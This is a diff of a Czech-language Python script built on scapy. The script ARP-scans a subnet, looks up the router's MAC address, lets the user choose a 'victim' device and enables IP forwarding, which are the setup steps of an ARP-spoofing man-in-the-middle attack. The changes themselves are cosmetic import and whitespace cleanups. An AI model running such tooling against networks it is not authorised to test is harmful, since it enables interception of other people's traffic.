@@ -1,13 +1,14 @@
-from scapy.all import Ether, ARP, srp, conf
-import platform
 import atexit
 import os
+import platform
+
+from scapy.all import ARP, Ether, conf, srp
 
 # --- Config --- #
 ip_addr = input("[?] Zadejte IP adresu včetně prefixu (např. 192.168.1.1/24): ")
-ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast
+ether = Ether(dst="ff:ff:ff:ff:ff:ff")
 arp = ARP(pdst=ip_addr)
-devices = []  # Seznam pro uložení nalezených zařízení
+devices = []
 
 # --- Sken sítě --- #
 def scan_network():
@@ -26,7 +27,7 @@ scan_network()
 # --- Výběr oběti --- #
 def select_target():
     router_ip = conf.route.route("0.0.0.0/0")[2]
-    
+
     print(f"\n[+] Zjišťuji MAC adresu routeru ({router_ip})...")
     answered_list = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip), timeout=3, verbose=0)[0]
 
@@ -46,12 +47,12 @@ def select_target():
 
         if choice.lower() == "r":
             return router_ip, router_mac
-        
+
         try:
             index = int(choice) - 1
             if index < 0:
                 raise IndexError
-            
+
             target = devices[index]
             return target["ip"], target["mac"]
         except (ValueError, IndexError):
@@ -86,4 +87,3 @@ if __name__ == "__main__":
     scan_network()
     print("\n[+] Zapínám IP forwarding...")
     toggle_forwarding(True)
-
